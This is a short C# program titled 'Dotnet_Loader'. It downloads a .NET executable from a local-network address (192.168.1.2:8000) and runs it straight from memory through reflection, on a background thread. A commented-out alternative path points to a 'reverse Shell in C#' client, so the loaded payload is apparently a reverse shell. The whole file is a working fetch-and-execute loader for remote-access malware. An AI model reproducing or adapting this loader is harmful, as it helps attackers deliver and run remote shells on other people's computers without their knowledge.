using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Reflection;
using System.Threading;
using System.Net;

namespace Dotnet_Loader
{
    internal class Program
    { 
        public void LoadFromFile(string PathToFile)
        {
            Assembly assembly = Assembly.LoadFile(PathToFile);
            string[] newargs = { };
            assembly.EntryPoint.Invoke(null, new object[] { newargs });

        }
        public void LoadFromURL(string url)
        {
            WebClient webClient = new WebClient();
            byte[] fileContent = webClient.DownloadData(url);
            Assembly assembly = Assembly.Load(fileContent);
            string[] newargs = { };
            assembly.EntryPoint.Invoke(null, new object[] { newargs });



        }
        static void Main(string[] args)
        {
            Thread t = new Thread(() =>
            {
                Program program = new Program();
                //program.LoadFromFile(@"C:\Users\Laptop\Desktop\reverse Shell in C#\Client\Client\bin\Debug\Client.exe"); // Put the file location from here
                program.LoadFromURL(@"http://192.168.1.2:8000/Client.exe");

            });

            t.Start(); // if you want the rest of the code to run at the same time as the loader 
            //t.Join(); // if you want to run the loader first then the rest of the code

           
            Console.WriteLine("Press Any thing To close\n");
            Console.ReadKey();


        }
    }
}
